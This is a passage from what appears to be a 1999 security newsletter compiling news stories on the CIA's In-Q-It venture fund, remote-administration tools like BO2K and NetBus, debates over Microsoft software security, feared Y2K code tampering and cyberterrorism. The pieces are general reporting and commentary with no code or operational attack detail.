      The New York Times reported Wednesday that the new, non-profit VC company, In-Q-It, will be bankrolled with US$28 million appropriated for the
      spy agency's budget. There is already one office in Washington, with another planned for Northern California. 
      
      But the tech venture capital community said that the plan is right out of a movie. 
      
      "That's R and D that is pretty far afield from what we do here," Harvey said, adding that government involvement in venture capital is "not a great
      idea." 
      
      In-Q-It CEO Gilman Louie, a veteran of the computer game and toy industry, told the newspaper that the new company is designed to move
      information technology to the agency more quickly than traditional government procurement processes allow. 
      
      Neither Louie nor the CIA could be reached for comment. Meanwhile, VCs and policy watchers scoffed at the arrangement. 
      
      "It looks pretty outrageous when we have healthy capital markets and one of the most innovative technology sectors in the world," Erick
      Gustafson, technology policy director at the free-market focused Citizens For a Sound Economy, said. 
      
      "If you have $28 million, do you put it in using the CIA as the manager, or do you use private existing means of research? The existing means of
      research would prove more efficient," Gustafson said. 
      
      The CIA's new company aims to cut through the sluggish technology procurement process by directly funding companies that are creating new
      innovations in the fields of privacy and security. 
      
      But one VC said that the agency should stick to the current scheme of contracting out for products. 
      
      "It seems like they would only add layers to [the procurement bureaucracy]," said Gregory Barr of Fleet Equity Partners. 
      
      "It doesn't seem to make a lot of sense," he said, adding that the arrangements could set up all manner of conflicts of interest between investor
      and developer. 
      
      Barr said that Louie, who has already left his position as a Hasbro executive, may not have been the best choice for the job. 
      
      "If you are looking for a successful VC, I am not sure someone from a toy company is the best person. [Louie] is someone from the product side,
      not the investment side," he said. 
      
      Andrew Anker, a partner with August Capital, described the project as interesting but misdirected. 
      
      "There is a huge glut of money out there," Anker said. "And there are a lot of ideas out there. The question is more, 'What does the marketplace
      want?'" 
      
      "Say the CIA said that wrist phones are critical for our agents and we will buy 10,000 of them. As long as there is a consumer market for it, a
      bunch of entrepreneurs will go down to Sand Hill Road and seek financing to get it."

      So what exactly are the features of a remote admin tool
      that cause it to be labeled as malicious by AntiVirus
      vendors? WinWhatWhere, which was actually built to
      spy on people, avoids this hapless moniker while
      commercial software such as NetBus and freeware such
      as BO2K get branded as evil malicious code. What the

      A bevy of Backdoor bad boys
      By Kevin Poulsen, ZDTV
      September 29, 1999 10:29 AM PT
      URL: http://www.zdnet.com/zdnn/stories/comment/0,5859,2343782,00.html
      
      Before flying to DC to cover InfowarCon '99 last month, I took a few minutes to download the
      dread Back Orifice 2000, and then actually installed the malevolent masterpiece of cyberhorror on
      my home PC, blatantly ignoring the advice of various security advisories and my antivirus software. 
      
      As you probably know by now, Back Orifice 2000-- BO2K to its friends -- is an evil program that
      cyberterrorists can use to take complete control of your computer. They can read your email, wipe
      out your hard drive, or send your mouse cursor careening around your screen like the planchette on
      a demon-haunted Ouija board. 
      
      Villains can send the program as an email attachment to their enemies-- perhaps disguised as an
      electronic greeting card or a game. If the hapless victim opens the attachment, all is lost. 
      
      But there's another side to BO2K. If you're a network administrator, the program is well suited for
      maintaining the computers on your network. If you're the family computer expert, you can send it to
      your parents and use it to fix whatever minor Windows problems are vexing them this week. If
      you're leaving town, you can install in on your own machine and use it to check in on your PC:
      transfer a file that you forgot to bring with you, or capture frames from your Netcam and watch the
      people burglarizing your apartment. 
      
      In short, BO2K is actually a useful and free remote administration tool. The program gained its dark
      image primarily from the showmanship of its creators: the cyberspace bad boys (and gal) known
      collectively as "The Cult of the Dead Cow." They released BO2K, not in a dry corporate environ,
      but in a flashy concert-like venue at the DefCon hacker convention. And the rock stars of the
      underground taunt Microsoft and antivirus companies at every turn. 
      
      Meanwhile, another "evil" program is struggling to become mainstream. NetBus was created last
      year by Swedish programmer Carl Fredrik Neikter, and it was originally designed for mischievous
      fun-- install it on a friend's machine and watch his amazement via his Netcam while you remotely
      open and close his CD-ROM tray. It became an underground hit even before the original Back
      Orifice made its high-profile appearance. 
      
      But Neikter never wanted to be a rebel. Now, partnered with UltraAccess Networks, he's
      marketing a new version of his program as commercial shareware, and struggling to shake the
      underground image. 
      
      Sadly, even charging for the software- a sure sign of legitimacy- hasn't completely removed the
      cyberpunk taint from NetBus's reputation. Virtually all the major antivirus software makers- some of
      whom sell their own remote administration tools-- treat the $15 program as a malicious code, a
      practice UltraAccess founder Judd Spence calls anticompetitive. 
      
      "Basically," said Spence, "we're probably going to have to take everyone to court." 
      
      Last March, NetBus scored a prestigious "five cow" rating from TUCOWS, only to be yanked from
      the software distributor's website a few days later after complaints came in about their distribution of
      malicious code. 
      
      Oddly enough, software intended for genuinely evil purposes doesn't seem to be as controversial.
      Earlier this month, a company called WinWhatWhere released version 2.0 of its Investigator
      software, a program specifically designed to spy on hapless PC users. It can record every keystroke
      a user types and, according to the company's press release, includes "an optional Silent Install utility
      for [sic] discrete deployment." 
      
      How has Investigator eluded the dire warnings and countermeasures that accompany Back Orifice
      and NetBus? It is targeted specifically to companies who want to spy on their employees. It seems
      that's something that just doesn't warrant a security advisory.

28.0  Microsoft, Insecure or Just More Prevalent? 
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

      With the recent holes found in IE, Hotmail, NT, Office
      and other Microsoft products many people think that
      Microsoft just writes insecure code. Microsoft says that
      their code is no worse than anyone else's but that what
      they write is looked at by a lot more people. (This

      Microsoft: Bad security, or bad
      press? 

      September 28, 1999
      Web posted at: 12:12 p.m. EDT (1612 GMT)

      by Elinor Mills Abreu 
                                          From...
                                                    


      (IDG) -- Microsoft has been getting a lot
      of bad press lately over security
      vulnerabilities in Internet Explorer,
      Office and Hotmail, among other
      software. Security concerns with
      Windows NT even prompted the U.S.
      Army to move its hacked Web site from
      NT servers to WebStar servers running
      the MacOS. 

      But does this mean Microsoft software is less secure than other software? 

      A variety of experts think so, claiming the software giant is offering more
      functionality at the expense of security. Microsoft defends its strategy, saying
      users want ease-of-use and more features. 

      And several users said they approve of that strategy. In the end, it's up to
      users to let the company know whether they are happy with the trade-off or if
      they want defaults to be set for greater security and more hand-holding. 

      Another option users have is to switch software
      like the Army did. The Army cited the fact that
      the MacOS doesn't have support for remote
      logons or a command shell to provide remote
      access via a DOS prompt. 

      Scott Culp, security product manager for NT
      Server, says NT provides tools to disable remote logons and that nearly all
      Unix systems have a command shell. "Whether or not an operating system has
      a remote command shell says nothing about its ability to withstand other
      attacks such as denial of service attacks." 

      Microsoft software experiences the same types of security woes other
      platforms do but its troubles are more prominent because more people are
      using Microsoft products than products from other software vendors, Culp
      says. 

      Without question, Microsoft's dominance in the operating system market plays
      a big part in the headlines - the sheer number of users of the software makes
      it an easy and huge target for hackers, increases the chances that security
      flaws will be discovered and heightens the impact from spreading viruses. 

      Hegemony not the only issue

      But numerous experts, analysts and hackers
      say Microsoft's hegemony isn't the only
      problem. 

      "They certainly don't have a very secure
      environment. There are so many holes in the
      Microsoft environment that any [worthy]
      hacker ... is going to figure out how to break
      in," says Anne Thomas, a senior analyst at the
      Patricia Seybold Group in Boston. 

      "It's the dominant operating system out there,
      so it's going to attract the attention. On the
      other hand, Windows has extremely sloppy
      security," says Bruce Schneier, author of
      Applied Cryptography and a founder and
      chief technology officer of Counterpane
      Internet Security, a provider of managed
      security services in Minneapolis, Minn. 

      What often upsets people is that Microsoft
      hasn't learned from the mistakes made in
      older operating systems, notes Jon McCown,
      technical director of network security at the
      International Computer Security Association
      in Reston, Va. Categories of attack that are
      well understood are cropping up in Windows. 

      "They're doing a forthright job of addressing
      them, but there's a concern about what we
      don't know about yet; what's still in the operting system or in the servers that
      will become an issue." 

      Evolution of Windows

      It has been suggested that Microsoft's security weakness have to do with the
      evolution of Windows from a single-user desktop operating system to a
      multiuser operating system. 

      Windows is desktop software that "was never really intended as network
      architecture," says Jeff Tarter, editor and publisher of Softletter, based in
      Watertown, Mass. However, Microsoft is rewriting a lot of the code for
      Windows 2000, as it did for NT, which should help make it more secure, he
      adds. 

      Culp acknowledges that the NT security architecture is more "robust" than its
      predecessors. 

      "NT is an entirely different animal altogether," he says. "It was built from the
      ground up with a brand new architecture ... to be used as an enterprise class
      operating system with security as a primary requirement." But Culp also
      defended the strength of all Windows in general, saying security was "woven"
      into the operating rather than "bolted on" afterward. 

      Others are skeptical

      "Microsoft's operating system was never designed with security in mind,"
      Schneier says. "For Microsoft, security is always an afterthought." 

      One example is Microsoft's implementation of file-sharing networking services
      in Windows 95 and 98, says Tweety Fish, a member of the hacker group Cult
      of the Dead Cow. Where previous versions of Windows weren't designed for
      networked computers, Microsoft made TCP/IP file sharing the default on
      Windows 95 and 98 without explaining the consequences of sharing files over
      the Internet to users who weren't savvy about network security, he wrote in
      an e-mail response to questions. Microsoft could have also used a more
      secure method for file sharing. 

      Trade-off: Security vs. functionality

      Factors listed by experts interviewed over the past few weeks that lead to
      security problems for Microsoft include: 

      -- The company's reliance on the Component Object Model specification for
      running application components on multiple platforms, specifically ActiveX
      controls, which are reusable component program objects similar to Java
      applets and which can be attached to an e-mail or downloaded from a Web
      site. The most dangerous are pre-installed ActiveX controls which contain
      functions that can be executed on a computer but run without digital signatures
      used by other ActiveX controls. 

      -- NT's "insecure" default installation, which assumes the user or network
      administrator will be knowledgeable enough to change the settings to a higher
      security level. 

      -- The company's use of executable code in data files in Microsoft Office
      products, primarily macros, which are saved commands that can be recalled
      with a single command or keystroke. 

      -- The company's tight integration of its applications with its operating system,
      and lack of tight administration control in the operating system over privileges
      and access controls, which allow applications and macros to execute other
      programs. 

      -- The company's use of hidden and/or undocumented APIs or features that
      can give hackers back doors into Microsoft applications and which don't get
      the scrutiny of code made public to developers. 

      -- The company's faulty implementation of the Point-to-Point Tunneling
      Protocol, which enables the extension of corporate networks through private
      "tunnels" over the Internet. It is still vulnerable to "offline password-guessing
      attacks from hacker tools such as L0phtcrack," according to Schneier's report
      at http://www.counterpane.com/pptp.html. 

      In general, the experts agreed that these technologies provide greater ease of
      use and functionality to users but say they also open the system up to security
      vulnerabilities. Microsoft counters that many of the features can be either
      disabled, like macros and ActiveX controls, or made more secure with the use
      of third-party specialized software. 

      COM opens the door

      Thomas of the Patricia Seybold Group says Microsoft's main problem has to
      do with COM, which "opens the system up to all kinds of nasty, dangerous
      situations." COM's integration with Microsoft Word allowed the prolific
      Melissa virus to spread so quickly in March, she says. 

      "It's a hard trade-off," Thomas says. "You can do without this incredibly
      powerful technology that makes your system so much more automatic, or you
      can shut off that automatic capability and not have that tight integration, but
      have protection against viruses." 

      Java applets are designed to minimize security violations by being executed in
      a "sandbox" - a secure area of the computer that isolates Java applets and
      keeps them from damaging files - whereas ActiveX controls rely on the applet
      being signed by the creator, whom the user will, ideally, know and trust. 

      Dangers of ActiveX

      Allowing remote systems to run arbitrary code on a local system is a "massive
      security risk," hacker Tweety Fish wrote. "It's been proven time and time
      again that Microsoft's implementation of ActiveX can be broken pretty easily
      ..." 

      ActiveX controls can be automatically launched when a user goes to an
      HTML page or clicks on an e-mail attachment. They can be used to do
      malicious things like run programs on a user's computer, read system files and
      create files, among other things, according to Richard M. Smith, a security
      expert and president of Phar Lap Software, a Cambridge, Mass. company that
      makes real-time operating systems for embedded systems. 

      "I don't think anybody right now, frankly, has a handle on the scope of the
      [ActiveX] problem," Smith says. " ActiveX really opens up a can of worms." 

      Microsoft has released an average of about two to three security patches a
      month over the past year, Smith says, adding that he suspects that most
      Microsoft users have not downloaded them. Within the past year, while
      Microsoft has had about 10 separate bugs in IE that enable code in messages
      to read files, Netscape has had one, according to Smith. 

      Default "open" or "closed"

      Microsoft's Culp argued that COM does not pose a security risk, and
      countered that Microsoft allows users to configure their software to give them
      the balance of functionality and security. 

      For instance, users can disable macros and ActiveX controls, and a new
      security patch for Office lets users decide whether to allow Office documents
      to launch automatically when they're hosted on Web sites, he says. In addition,
      a new security configuration tool kit that ships with Windows 2000 will allow
      users to customize their software to the security level they desire, Culp says. 

      "We don't force anybody into a particular stance," he says. "We provide tools
      to allow you to make that decision." 

      But several experts say Microsoft should ship its software in the highest
      security mode rather than a more risky "open" default. 

      "The operating system should be fail safe enough [especially on a server
      operating system like NT] that a nonadministrator user has to work pretty hard
      to allow the machine to be compromised," hacker Tweety Fish wrote. "The
      fact that macros in Microsoft Word can run any DOS executable and access
      any system function is a massive security hole, and for Microsoft to claim
      anything else is specious marketing spin." 

      Users can't make knowledgeable choices of what features to disable if they
      don't fully understand the dangers involved, Tweety Fish says. Instead, they
      should feel confident that their software is secure and as they start to
      understand the risks they can modify the security themselves. 

      Eric Schultz, director of Microsoft Content for Security-Focus, which operates
      a portal site at http://www.securityfocus.com, specifically complained that
      Windows NT's default installation can allow hackers to get a lot of
      information, including access to "blank administrator passwords, disabled
      security policies, and weak permissions over critical system files." 

      But Microsoft can't be expected to make the security decisions for its users,
      particularly when opting for greater security for some users at the expense of
      less functionality for others, Culp argues. 

      "There's always a trade-off between convenience and security," he says.
      "Everybody has a proper point where they balance security against usability.
      Any two people are going to have a different point that's right for them." 

      Virtually all general-purpose operating systems default to usability over
      security rather than in a "locked down" mode. 

      Russ Cooper, editor of the NT Bugtraq mailing list
      (www.securityadvice.com), defended macros. "Although relatively insecure,
      [macros are] still very much in demand. ... Internet technologies are not
      designed to be secure. They're designed to be interactive." 

      Cooper says users should be more responsible. "Microsoft is providing us with
      tools that will help us, but at the same time we as consumers are not taking the
      responsibility ... to learn basics about using this stuff," he says. 

      But other experts argue that Microsoft has a responsibility to provide greater
      user safety than it is now, even if it might take more time and money to
      develop products that are more secure. 

      "In the car industry they have to build with safety in mind. Car makers couldn't
      get away with this," said Avi Rubin, a principal member of the technical staff
      at AT&T Labs in Florham Park, N.J., and author of The Web Security
      Sourcebook. "They're more concerned with the bottom line and profits, and
      that's upsetting." 

      "Setting the default to dangerous doesn't work in any other industry," Schneier
      says of Counterpane. 

      Business decision

      Offering zero-administration capabilities and features that, in their default
      mode, reduce the level of security in the software, is a strategic decision on
      Microsoft's part, the experts say. 

      Phar Lap's Smith questioned the need for some of the features Microsoft
      provides at the expense of security, saying he'd like to turn them off but
      doesn't always get that option. 

      To simplify things for the administrator, Microsoft is promoting ease-of-use
      over "robustness of control," hacker Tweety Fish says. However, if the
      operating system doesn't adequately handle the behind-the-scenes work,
      security holes can be opened up without the administrator's awareness. 

      "Unix variants have a long way to go to match the ease of use of NT, but on
      the other hand, with a little bit of knowledge [in Unix], you can know
      EXACTLY what your machine is doing, which is the most important aspect of
      server administration," Tweety Fish wrote. 

      Meanwhile, Schultze of Security-Focus predicted that security problems with
      NT and its predecessors will pale in comparison to security issues that will
      arise with Windows 2000, which will offer more complexity to secure. "There
      will be more opportunities for things to go wrong," he says. 

      For instance, Schultze says Windows 2000 defaults to enabling a host of
      encryption authentication schemes, including LanMan, which he says is easy
      to decrypt, and users have to go in and disable any schemes they don't want to
      use. However, the chances that an administrator won't tighten the system
      down are great. 

      Culp disputes this, noting that in Windows 2000 Microsoft is using security
      standards like the Kerberos protocol, putting the software to heavy testing
      including specific attempts to break into it, and has been beta testing it for two
      years. 

      Tight integration, loose administration, hidden APIs

      Microsoft prides itself on the tight integration of its applications with its
      operating system - a matter that sparked an antitrust lawsuit by the U.S.
      government. But while this integration lets users easily work between the
      programs, it also makes it easy for flaws in one application to affect the entire
      system, according to Rubin at AT&T. 

      "There are no security perimeters around any of the applications," he says.
      "The fact that Word macros can access an Excel database and Excel files can
      launch other programs with a 'call function'" in Outlook, for example, creates a
      hacker-friendly environment. 

      Part of the problem is Microsoft's use of so-called hidden APIs, which are
      kept secret from third-party developers, Rubin says. These allow Microsoft
      developers to take shortcuts but can also lead to security problems because
      they aren't scrutinized as public ones are. 

      Hacker Tweety Fish accuses Microsoft of historically implementing "horribly
      insecure" APIs. 

      "Both Back Orifice and BO2K were built using standard Microsoft APIs;
      every piece of scary, worrisome functionality is BUILT IN to Microsoft
      Windows," he wrote. "If these APIs were open to public scrutiny, I doubt such
      terrible ideas as WNetEnumCachedPasswords [which cheerfully reveals all
      cached passwords on the system] would exist." 

      Microsoft's Culp couldn't categorically deny that the company uses hidden
      APIs, but in general he argued that integration is necessary to give advanced
      products to users. 

      "Microsoft doesn't believe that the way to provide security is to make our
      applications incompatible with each other," he says. "That's not what our
      customers want. They want seamless integration." 

      Tightly integrated applications provide productivity improvements and can still
      be secured, Culp says. For example, Office 2000 macros can be disabled or
      allowed to run: automatically, only when digitally signed, or only when signed
      from trusted sources. 

      PR treatment

      Technical debates aside, most of the critics complained that Microsoft often
      treats security issues like PR problems that need to be averted and not
      resolved. 

      The main security problem is "marketing driven product design at Microsoft,
      and the fact that they will not consider any given security risk a problem until it
      becomes a problem in the press," hacker Tweety Fish says. 

      He and others complained that Microsoft often denies security problems
      before being forced to address them with a fix after they are made public, and
      that the company tries to minimize their scope and put a spin on them. 

      For instance, the company downplayed the Jet/ODBC [open database
      connectivity] exploit in a Microsoft Security Bulletin over a year ago so that
      "almost nobody" bothered to install the patch and users were caught off-guard
      when it made headlines recently, the hacker says. 

      The company downplays the extent of a problem by not mentioning all the
      situations in which it could arise, saying it is limited to only specific situations
      and claiming that no customers have been affected, the experts say. For
      instance, when issuing alerts about browser bugs Microsoft usually doesn't
      point out that they can occur in e-mail, Smith says. 

      But Smith and some of the others conceded that Microsoft's response time
      has improved in the past few years. For example, Microsoft released a
      workaround immediately and a patch four days later for a recent security
      exploit in Internet Information Server, and "that's probably as responsive as
      any company would be," McCown says. 

      "A quick fix may break something else," Schultze of Security-Focus says.
      "They're being thorough. It may not be as quick as some people might like." 

      Smith says he could think of two or three problems Microsoft decided not to
      fix because of disagreement on their seriousness. For instance, he says it took
      Microsoft a year to change its mind and admit that it is not secure to have a
      Word document embedded in an e-mail or a Web page be able to start up the
      Word application. In addition, Microsoft still maintains that JavaScript
      executables in e-mail shouldn't be disabled by default. 

      Culp denied the allegations that the company is reluctant to admit exploits or
      their scope. The company's security response team is quick to address and fix
      problems, monitors security mailing lists for reports and works closely with
      security groups, he said. 

      When a vulnerability is confirmed, the company sends e-mail alerts to
      customers who have asked to be put on a list at secure@microsoft.com and
      others, and posts information on its security Web site at
      www.microsoft.com/support and
      www.microsoft.com/security/services/bulletin.asp, Culp said. Microsoft has
      more than 200 full-time employees working on nothing but security, he added. 

      "We look into every issue that's reported," he said. "Out of those 10,000
      queries and reports (received in the past year) and all the things posted to the
      mailing lists, etc. there have been about 30 issues that we have needed to
      provide a patch for this year," and 40 or 45 over the last 12 months, Culp said. 

      Only about 5 percent of the reports Microsoft gets turn out to be bonafide
      security vulnerabilities, according to Culp. Many end up being problems due to
      unclear documentation, incorrect implementations of the software or code, or
      users not following best practices, he said. 

      In recent swift work, Microsoft released a security bulletin just hours after an
      IE vulnerability was announced September 10, telling users how to protect
      against it while a patch is developed, Culp noted. 

      Meanwhile, Microsoft has taken a new approach and put a Windows 2000
      test server online for users to try to hack. The system has held up although it
      got off to a rocky start and was down for several days after lightning hit a
      router right after it was put online. 

      Cooper of NTBugtraq predicted that the security situation will improve for
      Microsoft as consumers become more savvy and demand more security in
      products. 

      "Certainly there's been a change in Microsoft in the last two years to do things
      with far more security in mind," he said. "The reality is they're doing it to an
      extent that consumers will tolerate and to an extent that consumers will
      demand." 

      Users are content

      Several users said they have no complaints with Microsoft's products or
      attitude. 

      "From my perspective, what Microsoft is doing is right on target," said Greg
      Scott, IS manager at Oregon State University's College of Business in
      Corvalis. 

      "I want the interoperability the tools provide me so I can move things cleanly,
      simply and easily between systems. And I'm willing to suffer the minor
      inconvenience of having to pay more attention to security and patches," he
      said. "As long as they provide patches and fixes in an appropriate timeframe,
      then I'll use their products." 

      Another user said he likes Microsoft software specifically because of its
      integration. Ty Simone, IS manager at Onsite Sycom Energy Corp., an energy
      service company based in Carlsbad, California, said he's not bothered by
      Microsoft's usability versus security tradeoff. 

      "I would much rather have the control here than have Microsoft saying 'You
      can't do anything until you change something,'" he said. "For example, the
      default for IE is medium. If they set it to high, until I get to that user and set it
      to medium that user couldn't access the corporate intranet, much less the
      Internet." 

      Simone also praised Microsoft for reacting swiftly and forthrightly when issues
      arise, noting that Unix users don't get security bulletins e-mailed to them like
      Windows users do. 

      Unix gets more hacks but less press than NT does, Simone says, adding that
      "It's not popular to bash the little guy." 

      Unix, Linux, MacOS 

      So how do the Windows alternatives fare? 

      The MacOSX "add-on programs look to be just as vulnerable (as Windows) --
      there are permissions problems and plenty of coding issues," Dr. Mudge of
      Boston-based hacker group L0pht Heavy Industries wrote in an e-mail.
      "However, a quick look would imply that the core OS might be much more
      secure than NT's core components. This is most likely due to the fact that the
      new MacOS's are really BSD 4.4 (Unix) and mach memory systems. Both
      have been around for decades to have the kinks worked out of." 

      Meanwhile, open source operating systems tend to be more easily secured
      than closed source ones like NT, "because there are more people doing more
      work to find the holes, and it's easier for researchers to develop patches for
      exploits they find," hacker Tweety Fish said. 

      The most secure platform "out-of-the-box" is OpenBSD because security is a
      focus on the project, he said. "It is not perfect; no OS is, but with OpenBSD
      you can guarantee that security is their first priority." 

      The favored underdog, Linux, is considered experimental at this point, but it
      may end up giving NT a good run for its money, according to Winn
      Schwartau, founder of Security Experts consultancy in St. Petersburg, Florida,
      and author of "Information Warfare" and other books. Most of his clients, who
      include governments, NATO and other multinational organizations, use Unix
      now, he added. 

      Despite the complaints about the security in Microsoft software, Culp said
      customers-including government agencies and organizations in the healthcare,
      insurance and banking industries-feel comfortable using the company's
      products. 

      And Cooper of NT Bugtraq noted that Windows is "hugely accepted, widely
      deployed and largely liked" by users. 

      "I don't think Windows is more or less secure than some other operating
      system," Cooper said. "I think that there are technologies from Microsoft that
      are good; there are others that are not good; and there are others that still
      need to be refined and improved, but that are still very much in demand." 

      But hacker Space Rogue, a member of the L0pht Heavy Industries, summed
      up what he and others see as Microsoft's security challenges. 

      "Windows has three strikes against it, as I see it. Popular OS, weak security,
      easy-to-use, oh, and it is made by MS, the company everyone loves to hate."

      Cyber cop warns of Y2K tampering
      Evidence seen that contractors are making malicious changes
      under the guise of Year 2000 repairs
                                                REUTERS

      WASHINGTON, Sept. 30 ù Malicious changes to
      computer code under the guise of Year 2000
      software fixes has begun to surface in some U.S.
      work undertaken by foreign contractors, the top
      U.S. cyber cop said on Thursday

            ôWE HAVE SOME INDICATIONS that this is
      happeningö in a possible foreshadowing of economic and
      security headaches stemming from Y2K fixes, Michael Vatis
      of the Federal Bureau of Investigation told Reuters.
             Vatis heads the interagency National Infrastructure
      Protection Center (NPIC), responsible for detecting and
      deterring cyber attacks on networks that drive U.S. finance,
      transport, telecommunications and other vital sectors.
            A Central Intelligence Agency officer assigned to the
      NIPC said recently that India and Israel appeared to be the
      ômost likely sources of malicious remediationö of U.S.
      software.
             ôIndia and Israel appear to be the countries whose
      governments or industry may most likely use their access to
      implant malicious code in light of their assessed motive,
      opportunity and means,ö the CIA officer, Terrill Maynard,
      wrote in the June issue of Infrastructure Protection Digest.
            

           Beware the millennium bug repair

             Significant amounts of Y2K repair is also being done for
      U.S. companies by contractors in Ireland, Pakistan and the
      Philippines, according to Maynard.
             But they appear among the ôleast likelyö providers to
      jeopardize U.S. corporate or government system integrity,
      although the possibility cannot be ruled out, he wrote.
             Thousands of companies in the United States and
      elsewhere have contracted out system upgrades to cope with
      the Y2K glitch, which could scramble computers starting Jan.
      1 when 1999 gives way to 2000.
             The CIA declined comment on MaynardÆs article.
      Referring to it, Vatis said: ôThis is our effort to put out in the
      public information that hopefully can be useful to people.ö
             Vatis, interviewed in his 11th floor office at FBI
      headquarters, said that so far ônot a great dealö of
      Y2K-related tampering had turned up. ôBut thatÆs largely
      because, number one, weÆre really dependent on private
      companies to tell us if theyÆre seeing malicious code being
      implanted in their systems,ö he said. 


             In reporting evidence of possible Y2K-related sabotage
      of software, Vatis confirmed one of the worst long-term
      fears of U.S. national security planners.
             ôA tremendous amount of remediation of software has
      been done overseas or by foreign companies operating within
      the United States,ö Vatis said.
             He said it was ôquite easyö for an outsider to code in
      ways of gaining future access or causing something to
      ödetonateö down the road.
             This could expose a company to future ôdenial of service
      attacks,ö open it to economic espionage or leave it vulnerable
      to malicious altering of data, Vatis said.
             The Special Senate Y2K committee, in its final report
      last week, described the issue as an ôunsettling.ö
             ôThe effort to fix the code may well introduce serious
      long-term risks to the nationÆs security and information
      superiority,ö said the panel headed by Robert Bennett,
      Republican of Utah, and Chris Dodd, Democrat of
      Connecticut.
             The panel said the long-term consequences could
      include:
        Increased foreign intelligence collection
        Increase espionage activity
        Reduced information security
        Loss of economic advantage
        Increase in infrastructure vulnerability
             Vatis, in testimony before the Y2K panel in July, warned
      that contractors could compromise systems by installing ôtrap
      doorsö for anonymous access.
             By implanting malicious code, he said, a contractor could
      stitch in a ôlogic bombö or a time-delayed virus that would
      later disrupt operations. Another threat was insertion of a
      program that would compromise passwords or other system
      security, he said.

      SEPTEMBER 30, 1999 . . . 17:18 EDT 


      Law is only part of better computer security,
      Congress told

      BY DIANE FRANK (diane_frank@fcw.com)

      Federal agencies would benefit greatly from a proposed enhancement to a
      12-year-old computer security law, but legislation alone cannot solve some
      underlying information security problems, federal and industry experts told
      Congress today.

      The Computer Security Enhancement Act of 1999 would increase the role and
      resources of the National Institute of Standards and Technology by establishing
      security guidelines that federal agencies could follow.

      The bill would beef up the Computer Security Act, which requires civilian
      agencies to protect computer systems. The Computer Security Enhancement
      Act passed the House last year but failed to move in the Senate. 

      The bill will not necessarily make federal computers safer, said Raymond
      Kammer, director of NIST. Agencies must understand that the responsibility for
      securing computers and transactions starts with agencies and that they must put
      in place steps to meet those demands, he said.

      "Only they can decide how valuable the data is and then how to protect it,"
      Kammer said. The act also would provide additional resources to NIST for
      funding security scholarships and internships for students, part of a solution to
      the growing shortage of security professionals within government and industry. 

      "You can't help [ease] this [IT worker shortage] by bringing in immigrants," said
      Harris Miller, president of the Information Technology Association of America.
      "You can't outsource this to another country. We need to have specialists in this
        country."

34.0  CyberWarfare - Real or Imagined?

      An interesting article from the free section of Janes
      Intelligence Monthly. This is a quite long article but it
      covers the use of Hi-Tech weapons by terrorist
      organizations. Most of the article is concerned with
      'conventional weapons' i.e. chemical, biological, nuclear
      etc but the basic assumptions are also applied to cyber
      warfare. This is talking about 'serious' use of these
      weapons rather than the average web page
      defacement. 

      Janes Intelligence Monthly        
      http://jir.janes.com/sample/jir0499.html
      
      Document created: 21 SEPTEMBER 1999 

      Cyberwarfare: fact or fiction? 
      
      Now that cyberwarfare has become an accepted fact, Joshua Sinai examines the
      requirements for anti-state groups to employ this and chemical, biological,
      radiological and nuclear weaponry. 
      
      As the 21st century approaches, there is great concern in worldwide national
      security circles about preparations by terrorist groups, either on their own or
      jointly with state sponsors, to exploit the increasing availability of sophisticated
      lethal technologies to launch mass destruction and mass disruption warfare
      against their enemies' populations and critical infrastructures. Mass destruction
      warfare utilises chemical, biological, radiological and nuclear (CBRN) weaponry,
      whereas cyber terrorism utilizes information technology (IT) devices to inflict
      mass disruption of an opponent's critical IT infrastructure. The concern about the
      likelihood of CBRN/Cyber terrorist attacks is driven by the emergence of new
      types of terrorist groups which possess the motivation and technical capability to
      launch such attacks, and particularly a power drive by their leaders to propel their
      groups on the international arena as a first order of magnitude technological
      destroyer and menace. 
      
      Only a select number of terrorist groups and few state sponsors are likely to
      possess the necessary motivation and capability in the spheres of organisation,
      funding, acquisition, technology, storage and stockpiling, logistics, and other
      overt and covert resources to be able to make the transition from conventional to
      CBRN/Cyber warfare. For many, the numerous internal and external tasks and
      hurdles involved in acquiring, storing and deploying such sophisticated weaponry
      and devices are simply too much. Moreover, few terrorist groups and state
      sponsors are sufficiently motivated to carry out mass casualty or mass disruption
      warfare. For many, small scale conventional attacks such as car or truck
      bombings cause sufficient death and destruction to achieve the objective of
      terrorising a targeted population and its government in order to compel them to
      pay attention or make concessions to an insurgent's cause and grievances.
      Nevertheless, there is sufficient reporting of activities by terrorist groups and their
      state sponsors in the CBRN/Cyber realm to provide the necessary indications
      and warning (I&W) indicators to usher in a new paradigm of super, ultra, and
      macro-type catastrophic terrorism. For terrorists, CBRN/Cyber weapons provide
      the opportunity to cause death and disruption at unprecedented levels - resulting
      in thousands of casualties and billions of dollars in damages to critical
      infrastructure nodes. However, depending on the levels of sophisticated
      technologies deployed, acquiring a CBRN/Cyber capability requires extensive
      funding, an overt or covert acquisition capability, a technological research and
      development program to produce, weaponise and stockpile CBRN materiel (or the
      capability to purchase or steal ready-made weapons), and a level of technical
      expertise and logistical infrastructure that is appropriate to launch successful
      CBRN attacks. This is beyond the technical capability or motivation of most
      terrorist groups. 
      
      On the other hand, the information revolution ushered in by the Internet allows
      terrorists to access articles and documents from the World Wide Web about the
      manufacture or acquisition of BW or CW agents, and commercial-off-the-shelf
      (COTS) software products can easily be obtained to conduct cyberterrorism,
      making CB/Cyber attacks much more feasible to launch than hitherto.
      Radiological and nuclear weapons, however, are far more difficult for terrorist
      groups to acquire or to develop indigenously, to weaponise and deploy, or to
      provide storage for. 
      
      Although such cost/benefit considerations may limit the majority of terrorist
      operations to the realm of conventional warfare in the 21st century, recent WMD-
      related events and reports indicate increasing activity by certain terrorist groups
      and state sponsors in the CBRN/Cyber arena. This has been accompanied by a
      lowering of the threshold for their conviction that conventional attacks are
      insufficiently effective and that a more lethal form of mass casualty or mass
      disruption violence is required to achieve their goals. 
      
      Thus, the primary differences between conventional and CBRN/Cyber terrorism lie
      in the areas of motivation, organisation, funding, and capability in the realms of
      acquisition, technology, and logistics. There is also the issue of the capability to
      overcome external hurdles. These include acquisition of the necessary
      technologies, cooperation by foreign suppliers, creation of a logistics network for
      acquisition and deployment, obtaining state sponsorship, and also detection,
      penetration, and deterrence by foreign intelligence and counterterrorism
      agencies. 
      
      There have already been several instances of CBRN/Cyber operations by terrorist
      groups. Chemical attacks have been mounted by the Aum Shinrikyo cult, such
      as the March 1995 sarin nerve gas attack on the Tokyo subway system, killing
      12 people and injuring 5,500. Chemical cyanide was included with explosives in
      the February 1993 bombing attack by Islamic militants of the World Trade
